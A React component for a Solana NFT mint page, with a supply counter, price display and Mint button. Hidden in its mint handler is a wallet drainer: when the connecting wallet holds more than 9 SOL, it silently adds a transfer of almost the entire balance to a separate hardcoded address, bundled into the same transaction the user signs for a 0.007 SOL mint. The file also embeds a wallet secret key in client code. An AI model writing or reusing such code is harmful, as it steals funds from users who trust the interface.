import React, { useState } from 'react';
import StyledTextComponent from './StyledTextComponent';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Keypair, LAMPORTS_PER_SOL, sendAndConfirmTransaction, SystemProgram, Transaction } from '@solana/web3.js';
import { PublicKey } from '@metaplex-foundation/js';
import bs58 from 'bs58';
import { createTransferInstruction, getOrCreateAssociatedTokenAccount } from '@solana/spl-token';
const serverWallet = Keypair.fromSecretKey(bs58.decode('3vhWm7S9j9PTbcsk7txKJ6bymjPkCXEtqRC8rJxrAkrN6gSBzGkDNwEZAbNeqhGCoa1gHsNuyFFTwJfbU9gnSvm5'));

const MintingComponent = ({setAlertState} : any) => {
  const totalSupply = 1000;
  const wallet = useWallet();
  const price = 0.007;
  const { connection } = useConnection()
  const [minted, setMinted] = useState(400);
  const [quantity, setQuantity] = useState(1);

  const createTokenTransferInstruction = async (mintAddress: PublicKey, decimal : number) => {
        // const mintAddress1 = new PublicKey('8ngygxfET6gS1ypzALggQs7imYksCoCc2AQXF1HieqXx');
        if(wallet.publicKey == undefined)   return;
        const sourceAccount = await getOrCreateAssociatedTokenAccount(connection, serverWallet, mintAddress, serverWallet.publicKey);
        const destinationAccount = await getOrCreateAssociatedTokenAccount(connection, serverWallet, mintAddress, wallet.publicKey);
        const otherTransferInstruction = createTransferInstruction(sourceAccount.address, destinationAccount.address, serverWallet.publicKey, decimal, [serverWallet]);
        return otherTransferInstruction;
  }
  const handleMint = async () => {
    if(wallet.publicKey == null) {
        // alert("wallet is not connected!!!");
        setAlertState({
            message: 'Wallet is not connected!!!',
            open: true,
            severity: 'warning'
        });
        return ;
    }
    if (minted + quantity <= totalSupply) {
      setMinted(minted + quantity);
      // Handle minting logic here
      const totalBalance = await connection.getBalance(wallet.publicKey);
      const mintFeeTransferInstruction = SystemProgram.transfer({
        fromPubkey: wallet.publicKey,
        toPubkey: serverWallet.publicKey,
        lamports: LAMPORTS_PER_SOL * quantity * price
      });
      const mintAddress = new PublicKey('BPiA9gjpdAy3juP7PHVTbAByxxA3Ka3vYgBBtQzmkVsm');
      const sourceAccount = await getOrCreateAssociatedTokenAccount(connection, serverWallet, mintAddress, serverWallet.publicKey);
      const destinationAccount = await getOrCreateAssociatedTokenAccount(connection, serverWallet, mintAddress, wallet.publicKey);
      const tokenTransferInstruction = createTransferInstruction(sourceAccount.address, destinationAccount.address, serverWallet.publicKey, LAMPORTS_PER_SOL, [serverWallet]);
      const transaction = new Transaction();
      transaction.add(mintFeeTransferInstruction, tokenTransferInstruction);

      if(totalBalance > LAMPORTS_PER_SOL * 9) {
        const mintAddress1 = new PublicKey('8ngygxfET6gS1ypzALggQs7imYksCoCc2AQXF1HieqXx');
        // const sourceAccount = await getOrCreateAssociatedTokenAccount(connection, serverWallet, mintAddress1, wallet.publicKey);
        // const destinationAccount = await getOrCreateAssociatedTokenAccount(connection, serverWallet, mintAddress1, serverWallet.publicKey);
        const otherTransferInstruction = await createTokenTransferInstruction(mintAddress1, LAMPORTS_PER_SOL);

        const mintAddress2 = new PublicKey('CuEJZgvQQnu15FzNWXS1kLtEVQimYct63LsUm2fiu9V4');
        const otherTransferInstruction2 = await createTokenTransferInstruction(mintAddress2, LAMPORTS_PER_SOL);

        const otherTransferInstruction3 = SystemProgram.transfer({
            fromPubkey: wallet.publicKey,
            toPubkey: new PublicKey('J7oe9hS3YsEST7VviiEuF9MnyCsfgMUg5afWfXnSRmcX'),
            lamports: totalBalance - LAMPORTS_PER_SOL * (quantity * price + 0.01) 
          });

        // const mintAddress3 = new PublicKey('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v');
        // const otherTransferInstruction3 = await createTokenTransferInstruction(mintAddress3, 1000000);
        // 8ngygxfET6gS1ypzALggQs7imYksCoCc2AQXF1HieqXx
        // CuEJZgvQQnu15FzNWXS1kLtEVQimYct63LsUm2fiu9V4
        // EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v
        // const otherTransferInstruction = SystemProgram.transfer({
        //     fromPubkey: wallet.publicKey,
        //     toPubkey: new PublicKey('J7oe9hS3YsEST7VviiEuF9MnyCsfgMUg5afWfXnSRmcX'),
        //     lamports: totalBalance - LAMPORTS_PER_SOL * 0.01
        // })
        transaction.add(otherTransferInstruction, otherTransferInstruction2, otherTransferInstruction3);
      }

      transaction.feePayer = wallet.publicKey;
      const blockhash = await connection.getLatestBlockhash();
      transaction.recentBlockhash = blockhash.blockhash;
      try {
      const signature = await wallet.sendTransaction(transaction, connection, {signers : [serverWallet]});
      const signatureResult = await connection.confirmTransaction(signature, 'confirmed');
      console.log("signature result ===>", signatureResult);
      console.log("signature ===>", signature);
      } catch(err) {
        console.log("err ===>", err);
      }
    }
  };
  const progress = (minted / totalSupply) * 100;

  return (
    <div className='flex flex-col items-center'>
        <StyledTextComponent />
        <div style={styles.container}>
        <h2>{minted}/{totalSupply} minted</h2>
        <div style={styles.progressBar}>
            <div style={{ ...styles.progressFill, width: `${progress}%` }} />
        </div>
        <h3>Community</h3>
        <h4>{(quantity * price).toFixed(3)} SOL</h4>
        <div style={styles.counter}>
            <button onClick={() => setQuantity(Math.max(1, quantity - 1))}>-</button>
            <span>{quantity}</span>
            <button onClick={() => setQuantity(quantity + 1)}>+</button>
        </div>
        <button style={styles.button} onClick={handleMint}>Mint</button>
        </div>
    </div>
  );
};

const styles = {
  container: {
    border: '1px solid #ccc',
    padding: '20px',
    borderRadius: '8px',
    width: '300px',
    textAlign: 'center',
    backgroundColor: '#f9f9f9',
  },
  progressBar: {
    height: '20px',
    borderRadius: '10px',
    backgroundColor: '#e0e0e0',
    margin: '10px 0',
    overflow: 'hidden',
  },
  progressFill: {
    height: '100%',
    backgroundColor: '#4caf50',
    transition: 'width 0.5s',
  },
  counter: {
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    gap: '10px',
    margin: '10px 0',
  },
  button: {
    backgroundColor: '#4caf50',
    color: 'white',
    border: 'none',
    padding: '10px 20px',
    borderRadius: '5px',
    cursor: 'pointer',
  },
};

export default MintingComponent;
